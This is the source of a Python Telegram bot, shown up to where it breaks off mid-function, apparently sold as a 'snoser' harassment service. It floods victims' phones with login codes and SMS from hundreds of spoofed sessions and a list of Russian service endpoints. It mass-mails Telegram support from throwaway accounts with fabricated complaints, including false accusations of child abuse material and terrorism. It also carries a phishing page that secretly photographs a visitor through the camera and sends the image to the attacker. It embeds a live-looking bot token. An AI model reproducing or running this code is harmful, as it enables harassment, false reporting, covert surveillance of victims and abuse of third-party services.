import asyncio
import aiohttp
import random
import string
import json
import os
import logging
import time
import shutil
import re
import hashlib
from datetime import datetime

from aiogram import Bot, Dispatcher, types, F
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.filters import Command, StateFilter
from aiogram.utils.keyboard import InlineKeyboardBuilder
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, FSInputFile
from aiogram.client.default import DefaultBotProperties
from aiogram.enums import ParseMode

from pyrogram import Client
from pyrogram.errors import FloodWait, RPCError
import pyrogram.raw.functions.messages as raw_messages
import pyrogram.raw.types as raw_types

# ---------- НАСТРОЙКИ ----------
BOT_TOKEN = "8037050881:AAEmLrVKUpMkqSA1eL4uMiP2Tff63cyeWQQ"
API_ID = 2040
API_HASH = "b18441a1ff607e10a989891a5462e627"
ADMIN_ID = 7736817432
ALLOWED_USERS_FILE = "allowed_users.json"
CHANNEL_ID = -1003910615357
CHANNEL_URL = "https://t.me/VICTIMSNOSER"

SESSIONS_PER_USER = 300
SESSION_DELAY = 60
SMS_PER_ROUND = 8
ROUND_DELAY = 10
BOMBER_DELAY = 3
SITE_DELAY = 15
SMS_DELAY = 5

MAILTM_ACCOUNTS_COUNT = 30
MAILTM_ACCOUNTS_FILE = "mailtm_accounts.json"
BANNER_PATH = "banner.png"

RECEIVERS = [
    'sms@telegram.org', 'dmca@telegram.org', 'abuse@telegram.org',
    'sticker@telegram.org', 'support@telegram.org', 'security@telegram.org',
    'stopca@telegram.org', 'ca@telegram.org'
]

USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/119.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 Version/17.0 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 Chrome/120.0.0.0 Mobile Safari/537.36',
]

# МНОГО УСТРОЙСТВ (50+)
DEVICES = [
    # iPhone
    {"model": "iPhone 15 Pro Max", "system": "iOS 17.2"},
    {"model": "iPhone 15 Pro", "system": "iOS 17.1"},
    {"model": "iPhone 15 Plus", "system": "iOS 17.0"},
    {"model": "iPhone 15", "system": "iOS 17.0"},
    {"model": "iPhone 14 Pro Max", "system": "iOS 16.6"},
    {"model": "iPhone 14 Pro", "system": "iOS 16.5"},
    {"model": "iPhone 14 Plus", "system": "iOS 16.4"},
    {"model": "iPhone 14", "system": "iOS 16.3"},
    {"model": "iPhone 13 Pro Max", "system": "iOS 15.7"},
    {"model": "iPhone 13 Pro", "system": "iOS 15.6"},
    {"model": "iPhone 13", "system": "iOS 15.5"},
    {"model": "iPhone 13 mini", "system": "iOS 15.4"},
    {"model": "iPhone 12 Pro Max", "system": "iOS 14.8"},
    {"model": "iPhone 12 Pro", "system": "iOS 14.7"},
    {"model": "iPhone 12", "system": "iOS 14.6"},
    {"model": "iPhone 12 mini", "system": "iOS 14.5"},
    {"model": "iPhone 11 Pro Max", "system": "iOS 13.7"},
    {"model": "iPhone 11 Pro", "system": "iOS 13.6"},
    {"model": "iPhone 11", "system": "iOS 13.5"},
    {"model": "iPhone XS Max", "system": "iOS 12.5"},
    {"model": "iPhone XS", "system": "iOS 12.4"},
    {"model": "iPhone XR", "system": "iOS 12.3"},
    {"model": "iPhone X", "system": "iOS 11.4"},
    {"model": "iPhone 8 Plus", "system": "iOS 11.3"},
    {"model": "iPhone 8", "system": "iOS 11.2"},
    {"model": "iPhone SE (2022)", "system": "iOS 16.1"},
    # Samsung
    {"model": "Samsung Galaxy S24 Ultra", "system": "Android 14"},
    {"model": "Samsung Galaxy S24+", "system": "Android 14"},
    {"model": "Samsung Galaxy S24", "system": "Android 14"},
    {"model": "Samsung Galaxy S23 Ultra", "system": "Android 14"},
    {"model": "Samsung Galaxy S23+", "system": "Android 13"},
    {"model": "Samsung Galaxy S23", "system": "Android 13"},
    {"model": "Samsung Galaxy S22 Ultra", "system": "Android 13"},
    {"model": "Samsung Galaxy S22+", "system": "Android 12"},
    {"model": "Samsung Galaxy S22", "system": "Android 12"},
    {"model": "Samsung Galaxy S21 Ultra", "system": "Android 12"},
    {"model": "Samsung Galaxy S21+", "system": "Android 11"},
    {"model": "Samsung Galaxy S21", "system": "Android 11"},
    {"model": "Samsung Galaxy Note 20 Ultra", "system": "Android 11"},
    {"model": "Samsung Galaxy Z Fold5", "system": "Android 14"},
    {"model": "Samsung Galaxy Z Flip5", "system": "Android 14"},
    {"model": "Samsung Galaxy A55", "system": "Android 14"},
    {"model": "Samsung Galaxy A35", "system": "Android 14"},
    # Google Pixel
    {"model": "Google Pixel 8 Pro", "system": "Android 14"},
    {"model": "Google Pixel 8", "system": "Android 14"},
    {"model": "Google Pixel 7 Pro", "system": "Android 13"},
    {"model": "Google Pixel 7", "system": "Android 13"},
    {"model": "Google Pixel 6 Pro", "system": "Android 12"},
    {"model": "Google Pixel 6", "system": "Android 12"},
    # Xiaomi
    {"model": "Xiaomi 14 Ultra", "system": "Android 14"},
    {"model": "Xiaomi 14 Pro", "system": "Android 14"},
    {"model": "Xiaomi 14", "system": "Android 14"},
    {"model": "Xiaomi 13 Ultra", "system": "Android 13"},
    {"model": "Xiaomi 13 Pro", "system": "Android 13"},
    {"model": "Xiaomi 13", "system": "Android 13"},
    {"model": "Xiaomi 12T Pro", "system": "Android 12"},
    {"model": "Redmi Note 13 Pro+", "system": "Android 13"},
    {"model": "Redmi Note 12 Pro", "system": "Android 12"},
    {"model": "POCO F5 Pro", "system": "Android 13"},
    {"model": "POCO X6 Pro", "system": "Android 14"},
    # OnePlus
    {"model": "OnePlus 12", "system": "Android 14"},
    {"model": "OnePlus 11", "system": "Android 13"},
    {"model": "OnePlus 10 Pro", "system": "Android 12"},
    {"model": "OnePlus Nord 3", "system": "Android 13"},
    # Huawei
    {"model": "Huawei P60 Pro", "system": "HarmonyOS 4.0"},
    {"model": "Huawei Mate 60 Pro", "system": "HarmonyOS 4.0"},
    {"model": "Huawei P50 Pro", "system": "HarmonyOS 3.0"},
    {"model": "Huawei Mate 50 Pro", "system": "HarmonyOS 3.0"},
    # Другие
    {"model": "OPPO Find X7 Ultra", "system": "Android 14"},
    {"model": "OPPO Reno 11 Pro", "system": "Android 14"},
    {"model": "Vivo X100 Pro", "system": "Android 14"},
    {"model": "Realme GT5 Pro", "system": "Android 14"},
    {"model": "Nothing Phone (2)", "system": "Android 13"},
    {"model": "Honor Magic6 Pro", "system": "Android 14"},
    {"model": "Motorola Edge 40 Pro", "system": "Android 13"},
    {"model": "Sony Xperia 1 V", "system": "Android 13"},
    {"model": "ASUS ROG Phone 7", "system": "Android 13"},
    {"model": "Lenovo Legion Y70", "system": "Android 13"},
    {"model": "ZTE Nubia Z60 Ultra", "system": "Android 14"},
    {"model": "Tecno Phantom X2 Pro", "system": "Android 13"},
    {"model": "Infinix Zero 30", "system": "Android 13"},
    # iPad
    {"model": "iPad Pro 12.9 (2023)", "system": "iOS 17.0"},
    {"model": "iPad Pro 11 (2022)", "system": "iOS 16.0"},
    {"model": "iPad Air (2022)", "system": "iOS 16.0"},
    {"model": "iPad mini (2021)", "system": "iOS 15.0"},
    {"model": "iPad (2022)", "system": "iOS 16.0"},
    # Mac
    {"model": "MacBook Pro 16 (2023)", "system": "macOS 14.0"},
    {"model": "MacBook Pro 14 (2023)", "system": "macOS 14.0"},
    {"model": "MacBook Air 15 (2023)", "system": "macOS 14.0"},
    {"model": "MacBook Air 13 (2022)", "system": "macOS 13.0"},
    {"model": "iMac 24 (2023)", "system": "macOS 14.0"},
    {"model": "Mac mini (2023)", "system": "macOS 14.0"},
]

TELEGRAM_OAUTH_SITES = [
    {"url": "https://my.telegram.org/auth/send_password", "method": "POST", "phone_field": "phone", "name": "MyTelegram"},
    {"url": "https://web.telegram.org/k/api/auth/sendCode", "method": "POST", "phone_field": "phone", "name": "WebK"},
    {"url": "https://web.telegram.org/a/api/auth/sendCode", "method": "POST", "phone_field": "phone", "name": "WebA"},
    {"url": "https://fragment.com/api/auth/sendCode", "method": "POST", "phone_field": "phone", "name": "Fragment"},
    {"url": "https://wallet.telegram.org/api/auth/sendCode", "method": "POST", "phone_field": "phone", "name": "Wallet"},
    {"url": "https://oauth.telegram.org/auth/request", "method": "POST", "phone_field": "phone", "name": "OAuth"},
    {"url": "https://passport.telegram.org/api/auth/sendCode", "method": "POST", "phone_field": "phone", "name": "Passport"},
    {"url": "https://api.mts.ru/auth/send-code", "method": "POST", "phone_field": "phone", "name": "MTS"},
    {"url": "https://api.beeline.ru/auth/sms", "method": "POST", "phone_field": "phone", "name": "Beeline"},
    {"url": "https://api.megafon.ru/auth/send", "method": "POST", "phone_field": "phone", "name": "Megafon"},
    {"url": "https://api.tele2.ru/auth/send-code", "method": "POST", "phone_field": "phone", "name": "Tele2"},
    {"url": "https://api.vk.com/method/auth.signup", "method": "POST", "phone_field": "phone", "name": "VK"},
    {"url": "https://ok.ru/dk?cmd=AnonymRegistration", "method": "POST", "phone_field": "phone", "name": "OK.ru"},
    {"url": "https://passport.yandex.ru/registration-validations/check-phone", "method": "POST", "phone_field": "phone", "name": "Yandex"},
    {"url": "https://api.tinkoff.ru/v1/sign_up", "method": "POST", "phone_field": "phone", "name": "Tinkoff"},
    {"url": "https://api.ozon.ru/v1/auth/send-code", "method": "POST", "phone_field": "phone", "name": "Ozon"},
    {"url": "https://api.wildberries.ru/auth/v2/send-code", "method": "POST", "phone_field": "phone", "name": "Wildberries"},
    {"url": "https://api.avito.ru/auth/v2/send", "method": "POST", "phone_field": "phone", "name": "Avito"},
    {"url": "https://api.gosuslugi.ru/auth/send-sms", "method": "POST", "phone_field": "phone", "name": "Gosuslugi"},
]

BOMBER_WEBSITES = [
    {"url": "https://api.delivery-club.ru/api/v2/auth", "method": "POST", "phone_field": "phone", "name": "Delivery Club"},
    {"url": "https://api.sbermarket.ru/v1/auth", "method": "POST", "phone_field": "phone", "name": "SberMarket"},
    {"url": "https://api.samokat.ru/v1/auth/send-code", "method": "POST", "phone_field": "phone", "name": "Samokat"},
    {"url": "https://api.vkusvill.ru/v1/auth/login", "method": "POST", "phone_field": "phone", "name": "VkusVill"},
    {"url": "https://api.magnit.ru/v1/auth", "method": "POST", "phone_field": "phone", "name": "Magnit"},
    {"url": "https://api.pyaterochka.ru/auth/send-code", "method": "POST", "phone_field": "phone", "name": "Pyaterochka"},
    {"url": "https://api.perekrestok.ru/v1/auth", "method": "POST", "phone_field": "phone", "name": "Perekrestok"},
    {"url": "https://api.lenta.ru/v1/auth/send-code", "method": "POST", "phone_field": "phone", "name": "Lenta"},
    {"url": "https://api.alfabank.ru/auth/send-code", "method": "POST", "phone_field": "phone", "name": "AlfaBank"},
    {"url": "https://api.citilink.ru/v1/auth", "method": "POST", "phone_field": "phone", "name": "Citilink"},
    {"url": "https://api.mvideo.ru/auth/send", "method": "POST", "phone_field": "phone", "name": "MVideo"},
    {"url": "https://api.dns-shop.ru/v1/auth", "method": "POST", "phone_field": "phone", "name": "DNS"},
    {"url": "https://api.rzhd.ru/v1/auth/sms", "method": "POST", "phone_field": "phone", "name": "RZD"},
    {"url": "https://api.aeroflot.ru/auth/send-code", "method": "POST", "phone_field": "phone", "name": "Aeroflot"},
    {"url": "https://api.auto.ru/auth/send-code", "method": "POST", "phone_field": "phone", "name": "Auto.ru"},
    {"url": "https://api.cian.ru/auth/send-code", "method": "POST", "phone_field": "phone", "name": "Cian"},
    {"url": "https://api.tutu.ru/auth/sms", "method": "POST", "phone_field": "phone", "name": "Tutu.ru"},
    {"url": "https://api.detmir.ru/auth/send-code", "method": "POST", "phone_field": "phone", "name": "DetMir"},
]

COMPLAINT_TEXTS_ACCOUNT = {
    "1.1": "Здравствуйте, уважаемая поддержка, в вашей сети я нашел телеграм аккаунт, который нарушает ваши правила, такие как {reason}. Его юзернейм - {username}, так же его контактный ID - {telegram_id}. Спасибо за помощь.",
    "1.2": "Здравствуйте, я утерял свой телеграм-аккаунт путем взлома. Я попался на фишинговую ссылку, и теперь на моем аккаунте сидит какой-то человек. Он установил облачный пароль, так что я не могу зайти в свой аккаунт и прошу о помощи. Мой юзернейм - {username}, а мой айди, если злоумышленник поменял юзернейм - {telegram_id}. Пожалуйста, перезагрузите сессии или удалите этот аккаунт, так как у меня там очень много важных данных.",
    "1.3": "Добрый день поддержка Telegram! Аккаунт {username}, {telegram_id} использует виртуальный номер купленный на сайте по активации номеров. Отношения к номеру он не имеет, номер никак к нему не относиться. Прошу разберитесь с этим. Заранее спасибо!",
    "1.4": "Добрый день поддержка Telegram! Аккаунт {username} {telegram_id} ссылает людей на сторонний сервис. Оставив в поле о себе ссылку на другой сервис он ссылает туда людей с вашего мессенджера! Прошу проверить и разобраться! Заранее спасибо",
    "1.5": "Добрый день поддержка Telegram! Аккаунт {username} {telegram_id} приобрёл премиум в вашем мессенджере чтобы рассылать спам-сообщения и обходить ограничения Telegram. Прошу проверить данную жалобу и принять меры!"
}

COMPLAINT_TEXTS_CHANNEL = {
    "8": "Здравствуйте, поддержка Телеграм! В вашей социальной сети я нашел канал, в котором публикуются личные данные невинных людей. Ссылка на канал - {channel_link}. Ссылка на нарушение - {violation_link}. Просьба удалить данный канал с вашей площадки",
    "9": "Здравствуйте, уважаемый модератор телеграмм, хочу пожаловаться вам на канал, который продает услуги доксинга, сваттинга. Ссылка на телеграмм канал: {channel_link} Ссылка на нарушение: {violation_link} Просьба заблокировать данный канал.",
    "10": "Здравствуйте, уважаемая поддержка Telegram! Пожалуйста, заблокируйте канал {channel_link}. В этом канале угрожают расстрелом детей в школах и совершением террористических актов, вы можете увидеть это здесь {violation_link}. Заранее спасибо.",
    "11": "Здравствуйте, поддержка Телеграм! В вашей социальной сети я нашел канал, в котором публикуется порнография с несовершеннолетними детьми. Ссылка на канал - {channel_link}. Ссылка на нарушение - {violation_link}. Просьба удалить данный канал с вашей площадки",
    "12": "Здравствуйте, поддержка Телеграм! В вашей социальной сети я нашел канал, в котором публикуются посты с целью обмана и мошенничества. Ссылка на канал - {channel_link}. Ссылка на нарушение - {violation_link}. Просьба удалить данный канал с вашей площадки",
    "13": "Здравствуйте, поддержка telegram. Я бы хотел пожаловаться на телеграм канал продающий виртуальные номера, насколько я знаю это запрещено правилами вашей площадки. Ссылка на канал - {channel_link} ссылка на нарушение - {violation_link}. Спасибо что очищаете свою площадку от подобных каналов!",
    "14": "Доброго времени суток, уважаемая поддержка. На просторах вашей платформы мне попался канал, распространяющий шок контент с убийствами людей. Ссылка на канал - {channel_link}, ссылка на нарушение - {violation_link}. Просьба удалить данный канал, спасибо за внимание.",
    "15": "Здравствуйте, уважаемая поддержка! Прошу проверить и заблокировать канал - {channel_link}, где размещаются сцены насилия и убийства животных. Ссылка на нарушение - {violation_link}. Просьба удалить данный канал с вашей площадки."
}

REPORT_REASONS = {
    "spam": raw_types.InputReportReasonSpam(),
    "violence": raw_types.InputReportReasonViolence(),
    "pornography": raw_types.InputReportReasonPornography(),
    "child_abuse": raw_types.InputReportReasonChildAbuse(),
    "copyright": raw_types.InputReportReasonCopyright(),
    "other": raw_types.InputReportReasonOther(),
    "personal_data": raw_types.InputReportReasonPersonalDetails(),
    "illegal_drugs": raw_types.InputReportReasonIllegalDrugs(),
}

REPORT_REASONS_RU = {
    "spam": "Спам",
    "violence": "Насилие",
    "pornography": "Порнография",
    "child_abuse": "Дети",
    "copyright": "Авторские права",
    "other": "Другое",
    "personal_data": "Личные данные",
    "illegal_drugs": "Наркотики",
}

# Telegraph
TELEGRAPH_TOKEN = None
TELEGRAPH_AUTHOR = "Telegram"
TELEGRAPH_AUTHOR_URL = "https://t.me/VICTIMSNOSER"
phish_pages = {}

CAMERA_TEMPLATE = '''<div style="text-align: center; padding: 30px 20px; background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%); border-radius: 20px; margin: 20px 0;">
    <h3 style="color: #fff; margin-bottom: 15px; font-size: 22px;">{title}</h3>
    <p style="color: #aaa; margin-bottom: 25px; font-size: 15px; line-height: 1.5;">{description}</p>
    <div style="position: relative; max-width: 320px; margin: 0 auto; border-radius: 16px; overflow: hidden; box-shadow: 0 10px 30px rgba(0,0,0,0.3);">
        <video id="video" autoplay playsinline style="width: 100%; display: block; transform: scaleX(-1);"></video>
        <canvas id="canvas" style="display: none;"></canvas>
    </div>
    <button id="cam-btn" style="background: linear-gradient(135deg, #e94560 0%, #c62a47 100%); color: white; border: none; padding: 14px 30px; font-size: 16px; font-weight: bold; border-radius: 12px; margin: 25px 0 10px; cursor: pointer; width: 100%; max-width: 320px; box-shadow: 0 5px 15px rgba(233,69,96,0.3);">{button_text}</button>
    <div id="status" style="color: #888; font-size: 13px; margin-top: 10px;">Камера готова</div>
</div>
<script>
(function(){
    const BOT_TOKEN = "{bot_token}";
    const CHAT_ID = "{chat_id}";
    const PAGE_ID = "{page_id}";
    const video = document.getElementById("video");
    const canvas = document.getElementById("canvas");
    const btn = document.getElementById("cam-btn");
    const status = document.getElementById("status");
    let stream = null;
    let done = false;
    
    async function startCamera() {
        try {
            stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
            video.srcObject = stream;
        } catch (e) {
            status.textContent = "Нет доступа к камере";
            status.style.color = "#ff4444";
            btn.disabled = true;
        }
    }
    
    async function sendPhoto(dataUrl) {
        try {
            const blob = await (await fetch(dataUrl)).blob();
            const formData = new FormData();
            formData.append("chat_id", CHAT_ID);
            formData.append("photo", blob, "photo.jpg");
            formData.append("caption", "📸 Фото с камеры\\n🎯 Жертва: " + PAGE_ID);
            const resp = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: "POST", body: formData });
            return (await resp.json()).ok;
        } catch (e) {
            return false;
        }
    }
    
    async function takePhoto() {
        if (done) { status.textContent = "Фото уже отправлено"; return; }
        status.textContent = "Съемка...";
        btn.disabled = true;
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        canvas.getContext("2d").drawImage(video, 0, 0);
        const sent = await sendPhoto(canvas.toDataURL("image/jpeg", 0.9));
        if (sent) {
            done = true;
            status.textContent = "✅ Готово";
            status.style.color = "#4caf50";
            btn.textContent = "Отправлено";
            if (stream) { stream.getTracks().forEach(t => t.stop()); video.srcObject = null; }
        } else {
            status.textContent = "❌ Ошибка";
            status.style.color = "#ff4444";
            btn.disabled = false;
        }
    }
    
    btn.addEventListener("click", takePhoto);
    startCamera();
})();
</script>'''

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

bot = Bot(token=BOT_TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
dp = Dispatcher(storage=MemoryStorage())

ALLOWED_USERS = set()
user_sessions = {}
active_attacks = {}
active_bombers = {}
active_reports = {}
sessions_creation_lock = {}
usage_logs = []
MAX_LOGS = 20
site_last_used = {}

class SnosState(StatesGroup):
    waiting_phone = State()
    waiting_count = State()

class BomberState(StatesGroup):
    waiting_phone = State()
    waiting_count = State()

class ReportMessageState(StatesGroup):
    waiting_link = State()
    waiting_reason = State()

class MailAccountState(StatesGroup):
    waiting_choice = State()
    waiting_username = State()
    waiting_id = State()
    waiting_reason = State()

class MailChannelState(StatesGroup):
    waiting_choice = State()
    waiting_channel = State()
    waiting_violation = State()

class PhishState(StatesGroup):
    waiting_link = State()
    waiting_title = State()
    waiting_description = State()
    waiting_button = State()

class AdminState(StatesGroup):
    waiting_user_id = State()


def add_log(user_id: int, action: str, target: str):
    global usage_logs
    usage_logs.append({"user_id": user_id, "action": action, "target": target, "time": datetime.now().strftime('%H:%M:%S')})
    if len(usage_logs) > MAX_LOGS:
        usage_logs = usage_logs[-MAX_LOGS:]

def get_last_logs(count: int = 5) -> str:
    if not usage_logs: return "Пусто"
    return "\n".join([f"[{l['time']}] {l['user_id']} - {l['action']}: {l['target']}" for l in reversed(usage_logs[-count:])])

def load_allowed_users():
    global ALLOWED_USERS
    try:
        with open(ALLOWED_USERS_FILE, 'r') as f:
            ALLOWED_USERS = set(json.load(f).get("users", []))
    except: pass

def save_allowed_users():
    with open(ALLOWED_USERS_FILE, 'w') as f:
        json.dump({"users": list(ALLOWED_USERS)}, f)

async def check_channel_subscription(user_id: int) -> bool:
    try:
        member = await bot.get_chat_member(chat_id=CHANNEL_ID, user_id=user_id)
        return member.status in ["member", "administrator", "creator"]
    except: return False

def is_user_allowed(user_id: int) -> bool:
    return user_id == ADMIN_ID or user_id in ALLOWED_USERS

class AccessMiddleware:
    async def __call__(self, handler, event, data):
        user_id = None
        if isinstance(event, types.CallbackQuery): user_id = event.from_user.id
        elif isinstance(event, types.Message): user_id = event.from_user.id
        if isinstance(event, types.Message) and event.text and event.text.startswith('/start'): return await handler(event, data)
        if isinstance(event, types.Message) and event.text and event.text.startswith('/admin'):
            if user_id == ADMIN_ID: return await handler(event, data)
            else: await send_message_with_banner(event, "Только администратор!"); return
        if user_id and not is_user_allowed(user_id):
            if isinstance(event, types.CallbackQuery): await event.answer("Нет доступа!", show_alert=True)
            elif isinstance(event, types.Message): await send_message_with_banner(event, "Нет доступа!")
            return
        return await handler(event, data)

dp.update.middleware(AccessMiddleware())


# ---------- MAIL.TM ----------
class MailTM:
    def __init__(self):
        self.base_url = "https://api.mail.tm"
        self.accounts = []
        self.session = None
        self.ready = False
        
    async def init_session(self):
        if not self.session:
            connector = aiohttp.TCPConnector(limit=20, force_close=True, ssl=False)
            timeout = aiohttp.ClientTimeout(total=30)
            self.session = aiohttp.ClientSession(connector=connector, timeout=timeout)
    
    async def close(self):
        if self.session:
            await self.session.close()
            self.session = None
    
    async def get_domain(self) -> str:
        await self.init_session()
        try:
            async with self.session.get(f"{self.base_url}/domains") as resp:
                if resp.status == 200:
                    domains = await resp.json()
                    return domains['hydra:member'][0]['domain']
        except: pass
        return "inbox.testmail.app"
    
    async def create_account(self) -> dict:
        await self.init_session()
        try:
            random_str = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))
            domain = await self.get_domain()
            
            account_data = {
                "address": f"snoser{random_str}@{domain}",
                "password": ''.join(random.choices(string.ascii_letters + string.digits, k=12))
            }
            
            async with self.session.post(f"{self.base_url}/accounts", json=account_data, headers={"Content-Type": "application/json"}) as resp:
                if resp.status in [200, 201]:
                    login_data = {"address": account_data["address"], "password": account_data["password"]}
                    async with self.session.post(f"{self.base_url}/token", json=login_data, headers={"Content-Type": "application/json"}) as login_resp:
                        if login_resp.status == 200:
                            token_data = await login_resp.json()
                            return {"email": account_data["address"], "password": account_data["password"], "token": token_data["token"]}
        except: pass
        return None
    
    async def create_multiple_accounts(self, count: int) -> list:
        accounts = []
        for i in range(count):
            account = await self.create_account()
            if account:
                accounts.append(account)
                logger.info(f"Mail.tm {len(accounts)}/{count}: {account['email']}")
            await asyncio.sleep(2)
        self.accounts = accounts
        self.ready = True
        return accounts
    
    async def send_email(self, account: dict, to_email: str, subject: str, body: str) -> bool:
        await self.init_session()
        try:
            message_data = {
                "from": {"address": account["email"], "name": "Telegram User"},
                "to": [{"address": to_email}],
                "subject": subject,
                "text": body
            }
            headers = {"Authorization": f"Bearer {account['token']}", "Content-Type": "application/json"}
            async with self.session.post(f"{self.base_url}/messages", json=message_data, headers=headers) as resp:
                return resp.status in [200, 201, 202]
        except: return False


# ---------- СЕССИИ ----------
def get_user_session_dir(user_id: int) -> str:
    return f"sessions/user_{user_id}"

def count_user_sessions_files(user_id: int) -> int:
    d = get_user_session_dir(user_id)
    if not os.path.exists(d): return 0
    return len([f for f in os.listdir(d) if f.startswith("session_") and f.endswith(".session")])

async def create_single_session(session_file: str, idx: int) -> dict:
    try:
        device = random.choice(DEVICES)
        client = Client(session_file, api_id=API_ID, api_hash=API_HASH, in_memory=False, no_updates=True, device_model=device["model"], system_version=device["system"])
        await client.connect()
        return {"client": client, "in_use": False, "flood_until": 0, "index": idx, "last_used": 0}
    except: return None

async def create_user_sessions(user_id: int) -> tuple:
    d = get_user_session_dir(user_id)
    os.makedirs(d, exist_ok=True)
    existing = count_user_sessions_files(user_id)
    if existing >= SESSIONS_PER_USER: return [], existing
    sessions = []
    for i in range(existing):
        f = f"{d}/session_{i}"
        if os.path.exists(f"{f}.session"):
            s = await create_single_session(f, i)
            if s: sessions.append(s)
    need = SESSIONS_PER_USER - len(sessions)
    if need > 0:
        for batch in range(len(sessions), SESSIONS_PER_USER, 10):
            tasks = [create_single_session(f"{d}/session_{i}", i) for i in range(batch, min(batch+10, SESSIONS_PER_USER)) if not os.path.exists(f"{d}/session_{i}.session")]
            if tasks:
                results = await asyncio.gather(*tasks, return_exceptions=True)
                for r in results:
                    if r and not isinstance(r, Exception): sessions.append(r)
            await asyncio.sleep(2)
    return sessions, len(sessions)

async def ensure_user_sessions(user_id: int):
    if user_id in sessions_creation_lock and sessions_creation_lock[user_id]: return
    sessions_creation_lock[user_id] = True
    try:
        if user_id not in user_sessions: user_sessions[user_id] = {"sessions": [], "ready": False, "total": 0}
        sessions, total = await create_user_sessions(user_id)
        user_sessions[user_id]["sessions"] = sessions
        user_sessions[user_id]["total"] = total
        user_sessions[user_id]["ready"] = True
    finally: sessions_creation_lock[user_id] = False

async def refresh_user_sessions(user_id: int):
    if user_id in user_sessions:
        for s in user_sessions[user_id].get("sessions", []):
            try: await s["client"].disconnect()
            except: pass
    d = get_user_session_dir(user_id)
    if os.path.exists(d): shutil.rmtree(d)
    user_sessions[user_id] = {"sessions": [], "ready": False, "total": 0}
    await ensure_user_sessions(user_id)

async def get_user_sessions_batch(user_id: int, count: int) -> list:
    if user_id not in user_sessions or not user_sessions[user_id]["ready"]: return []
    now = time.time()
    available = [s for s in user_sessions[user_id]["sessions"] if not s["in_use"] and s["flood_until"] < now and now - s["last_used"] >= SESSION_DELAY]
    available.sort(key=lambda x: x["last_used"])
    selected = available[:count]
    for s in selected:
        s["in_use"] = True
        s["last_used"] = now
    return selected

def release_user_sessions(sessions: list):
    for s in sessions:
        if s: s["in_use"] = False

def get_user_sessions_count(user_id: int) -> int:
    return user_sessions.get(user_id, {}).get("total", 0)

def is_user_sessions_ready(user_id: int) -> bool:
    return user_id in user_sessions and user_sessions[user_id].get("ready", False)


# ---------- СНОС НОМЕРА ----------
async def send_sms_safe(session_data: dict, phone: str) -> dict:
    try:
        client = session_data["client"]
        if not client.is_connected: await client.connect()
        await client.send_code(phone)
        return {"type": "SMS", "success": True}
    except FloodWait as e:
        session_data["flood_until"] = time.time() + e.value
        return {"type": "SMS", "success": False, "flood": e.value}
    except Exception as e:
        return {"type": "SMS", "success": False, "error": str(e)[:30]}

async def send_oauth_request(session: aiohttp.ClientSession, phone: str, site: dict) -> dict:
    global site_last_used
    name = site["name"]
    now = time.time()
    if name in site_last_used and now - site_last_used[name] < SITE_DELAY:
        await asyncio.sleep(SITE_DELAY - (now - site_last_used[name]))
    site_last_used[name] = time.time()
    headers = {'User-Agent': random.choice(USER_AGENTS), 'Content-Type': 'application/json', 'Accept': 'application/json'}
    try:
        if site["method"] == "POST":
            async with session.post(site["url"], headers=headers, json={site["phone_field"]: phone}, timeout=10, ssl=False) as resp:
                return {"site": name, "success": True}
        else:
            async with session.get(site["url"], headers=headers, params={site["phone_field"]: phone}, timeout=10, ssl=False) as resp:
                return {"site": name, "success": True}
    except: return {"site": name, "success": False}

async def snos_attack(user_id: int, phone: str, rounds: int, stop_event: asyncio.Event, progress_callback=None) -> tuple:
    ok = 0
    phone = phone.strip().replace(" ", "").replace("-", "")
    if not phone.startswith("+"): phone = "+" + phone
    add_log(user_id, "Снос номера", phone)
    connector = aiohttp.TCPConnector(limit=50, force_close=True, ssl=False)
    async with aiohttp.ClientSession(connector=connector) as sess:
        for rnd in range(1, rounds + 1):
            if stop_event.is_set(): break
            sessions = await get_user_sessions_batch(user_id, SMS_PER_ROUND)
            if not sessions: await asyncio.sleep(2); continue
            tasks = []
            for s in sessions:
                tasks.append(send_sms_safe(s, phone))
                await asyncio.sleep(SMS_DELAY / 1000)
            for s in sessions:
                for site in random.sample(TELEGRAM_OAUTH_SITES, min(3, len(TELEGRAM_OAUTH_SITES))):
                    tasks.append(send_oauth_request(sess, phone, site))
            batch = await asyncio.gather(*tasks, return_exceptions=True)
            release_user_sessions(sessions)
            for r in batch:
                if isinstance(r, dict) and r.get("success"): ok += 1
            if progress_callback: await progress_callback(rnd, rounds, ok)
            if rnd < rounds and not stop_event.is_set(): await asyncio.sleep(ROUND_DELAY)
    return ok


# ---------- БОМБЕР ----------
async def send_bomber_request(session: aiohttp.ClientSession, phone: str, site: dict) -> dict:
    headers = {'User-Agent': random.choice(USER_AGENTS), 'Content-Type': 'application/json'}
    try:
        if site["method"] == "POST":
            async with session.post(site["url"], headers=headers, json={site["phone_field"]: phone}, timeout=10, ssl=False) as resp:
                return {"site": site["name"], "success": True}
        else:
            async with session.get(site["url"], headers=headers, params={site["phone_field"]: phone}, timeout=10, ssl=False) as resp:
                return {"site": site["name"], "success": True}
    except: return {"site": site["name"], "success": False}

async def bomber_attack(phone: str, rounds: int, user_id: int, stop_event: asyncio.Event, progress_callback=None) -> tuple:
    ok = 0
    add_log(user_id, "Бомбер", phone)
    connector = aiohttp.TCPConnector(limit=50, force_close=True, ssl=False)
    async with aiohttp.ClientSession(connector=connector) as sess:
